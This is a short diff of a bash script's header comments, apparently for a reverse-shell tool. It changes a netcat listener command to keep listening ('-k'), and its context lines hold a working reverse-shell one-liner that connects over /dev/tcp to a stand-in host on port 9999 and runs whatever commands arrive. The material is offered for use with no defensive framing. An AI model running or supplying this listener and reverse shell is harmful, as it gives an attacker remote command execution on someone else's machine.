@@ -1,6 +1,6 @@
 #!/bin/bash
 # first run listener for example:
-# nc -l -p 8080 -vvv
+# nc -l -p 8080 -vvv -k
 # one liner example for start rev_shell:
 # exec 5<>/dev/tcp/example.com/9999; while read line 0<&5; do $line 2>&5 >&5; done
 # or run:
